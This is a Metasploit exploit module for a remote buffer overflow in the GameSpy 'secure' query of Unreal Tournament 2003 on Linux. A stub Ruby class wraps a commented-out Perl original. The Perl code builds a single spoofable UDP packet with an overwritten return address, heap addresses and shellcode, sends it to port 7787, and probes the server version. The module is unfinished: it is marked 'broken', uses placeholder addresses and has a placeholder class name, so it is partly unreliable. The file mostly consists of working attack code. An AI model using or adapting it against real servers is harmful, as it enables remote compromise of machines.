require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Unreal Tournament 2003 "secure" Overflow (Linux)',
			'Description'    => %q{
				
				      This is an exploit for the GameSpy secure query in
				the Unreal Engine.

				      This exploit only requires one UDP packet, which can
				be both spoofed
				      and sent to a broadcast address.
				Usually, the GameSpy query server listens
				      on port
				7787, but you can manually specify the port as well.

				      The RunServer.sh script will automatically restart the
				server upon a crash, giving
				      us the ability to
				bruteforce the service and exploit it multiple
				      times. 
				    
					
			},
			'Author'         => [ 'hdm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '7217'],
					[ 'BID', '10570'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "\x5c\x00",
					'MinNops'  => 512,

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'linux',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => '',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::ut2003_secure_linux;
use base "Msf::Exploit";
use strict;

my $advanced = { };
my $info =
{
    'Name'  => 'Unreal Tournament 2003 "secure" Overflow (Linux)',
    'Version'  => '$Revision$',
    'Authors' => [ 'H D Moore <hdm [at] metasploit.com>', ],
    'Arch'  => [ 'x86' ],
    'OS'    => [ 'linux' ],
    'Priv'  => 1,
    'UserOpts'  => {
                    'RHOST' => [1, 'ADDR', 'The target address'],
                    'RPORT' => [1, 'PORT', 'The target port', 7787],
                   },
    'Payload' => {
                    'Space'     => 1024,
             		'BadChars'  => "\x5c\x00",
                    'MinNops'   => 512,
                 },
    
    'Description'  =>  qq{
      This is an exploit for the GameSpy secure query in the Unreal Engine.

      This exploit only requires one UDP packet, which can be both spoofed
      and sent to a broadcast address. Usually, the GameSpy query server listens
      on port 7787, but you can manually specify the port as well.

      The RunServer.sh script will automatically restart the server upon a crash, giving
      us the ability to bruteforce the service and exploit it multiple
      times. 
    },
    'Refs'  =>  [ 
                    ['OSVDB',   7217],
			        ['BID',     10570],
                ],     
    'DefaultTarget' => 0,
    'Targets' => [
			      ['UT2003 Linux Build Autodetect'],  
			      ['UT2003 Linux Build 2206', 0x12345678, 0x8080fbc],
                 ],
    'Keys'  => ['broken'],
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}

sub Exploit {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
    my $target_idx  = $self->GetVar('TARGET');
    my $target      = $self->Targets->[$target_idx];

    my $request = Pex::Text::PatternCreate(1024);

    if(0 && $target_idx == 0) # Autodetect and adjust payload accordingly...
    {
        my $versionNum = $self->GetVersion($target_host, $target_port);

        if(! $versionNum) {
            $self->PrintLine('[*] Could not obtain Version from host ' . $target_host . ':' . $target_port);
            $self->PrintLine('[*] Aborting...');
            return;
        }
        elsif($versionNum == 3120) {
            $target = $self->Targets->[1];
        }
        elsif ($versionNum == 3186) {
            $target = $self->Targets->[2];
        }
        elsif ($versionNum == 3204) {
            $target = $self->Targets->[3];
        }      
        elsif (! $versionNum ) {
			$self->PrintLine('[*] No response from host');
            $self->PrintLine('[*] Aborting...');
            return;
        }
        else {
            $self->PrintLine('[*] Detected Version ' . $versionNum . ' on host ' . $target_host . ':' . $target_port . "isn't vulnerable to attack");
            $self->PrintLine('[*] Aborting...');
            return;
        }
        $self->PrintLine('[*] Detected Vulnerable Version ' . $versionNum . ' on host ' . $target_host . ':' . $target_port);
        $self->PrintLine('[*] Assembling Payload for version ' . $versionNum);
    }


	$target->[2] = 0xbfffc250; # heap address :(
	
	# add sp, 0x1560
    # jmp esp
	my $Jumper = "\x66\x81\xC4\x60\x15\xFF\xE4\x41";
    $Jumper = ("\xcc" x 4) . "XXXX";
	
    # (add    BYTE PTR [eax],al) x 3
    substr($request, 36, "\xeb\x06", 2);

	# return address
    substr($request, 40, 4, pack('V', $target->[1] ));

    substr($request, 44, 4, pack('V', $target->[2] ));
    substr($request, 48, 4, pack('V', $target->[2] ));
    substr($request, 52, 4, pack('V', $target->[2] ));

	# 0x8080fb0:      0x00000000      0x00000000      0x00000000      0x00000000
    # 0x8080fc0 <data_start>: 0x00000000      0x080861e8      0x00000000      0x00000000   
	# 0x8081110 <tailfd.430>: 0x00000000      0x00000000      0x00000000      0x00000000
	# 0x8081120 <__vt_15FConfigCacheIni>:     0x00000000      0x08067e54      0x0807b350 0x0807b290
    
	substr($request, 0, length("\\secure\\"), "\\secure\\");    	
    substr($request, 56, $shellcode); 	

    my $sock = Msf::Socket::Udp->new
    (
        PeerAddr => $target_host,
        PeerPort => $target_port,
    );

    if($sock->IsError) {
        $self->PrintLine('[*] Error creating socket: ' . $sock->GetError);
        return;
    }

    $self->PrintLine('[*] Sending UDP Secure Request (Dest Port: ' . $target_port . ') (' . length($request) . ' bytes)');
    if(!$sock->Send($request)) {
      $sock->PrintError;
      return;
    }
    sleep(2);

    return;
}

sub Check
{
    my $self = shift();
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $versionNum  = $self->GetVersion($target_host, $target_port);

    if(! $versionNum) {
        $self->PrintLine("[*] Couldn't detect Unreal Tournament Server at ". $target_host . ':' . $target_port); 
        return $self->CheckCode('Generic');
    }
    else {
        $self->PrintLine('[*] Detected Unreal Tournament Server Version: ' . $versionNum . ' at ' . $target_host . ':' . $target_port);
        if ($versionNum =~ /^(3...)$/) {
            $self->PrintLine("[*] The server is running UT2004");
            return $self->CheckCode('Safe');
        } 
        elsif ($versionNum =~ /^(2...)$/) {
        	$self->PrintLine("[*] The server appears to be running UT2003");
            return $self->CheckCode('Appears');
        }
        
        $self->PrintLine("[*] The server is more than likely patched");
        return $self->CheckCode('Safe');
    }
}


sub GetVersion 
{
    my $self = shift();
    my $target_host = shift();
    my $target_port = shift();

    my $s = Msf::Socket::Udp->new
    (
        PeerAddr => $target_host,
        PeerPort => $target_port,
    );

	if($s->IsError()) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}
	
	$self->PrintLine('[*] Sending UDP Version Request to ' . $target_host . ':' . $target_port);

	my $versionRequest = "\\basic\\";
	if(!$s->Send($versionRequest)) {
		$s->PrintError;
		return;
	}
    
	my $versionReply = $s->Recv(-1, 10);
    my $versionNum;
    
    if ($versionReply =~ m/\\gamever\\([0-9]{1,5})/) {
        $versionNum = $1;
    }
    
    return $versionNum;
}

1;

=end


end
end	
